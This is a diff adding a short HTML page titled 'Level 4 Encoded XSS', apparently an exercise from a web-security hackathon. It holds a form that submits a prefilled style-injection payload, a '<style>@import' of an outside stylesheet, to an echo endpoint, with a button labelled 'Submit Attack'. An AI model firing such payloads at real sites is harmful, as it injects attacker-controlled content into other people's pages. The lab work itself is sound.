@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><title>Level 4 Encoded XSS</title></head>
+<body>
+  <h1>Level 4 Encoded Payload Test</h1>
+  <form method="POST" action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level4/echo.php">
+    <input name="input" value='<style>@import 'https://example.com';</style>' size="120" />
+    <button type="submit">Submit Attack</button>
+  </form>
+</body>
+</html>
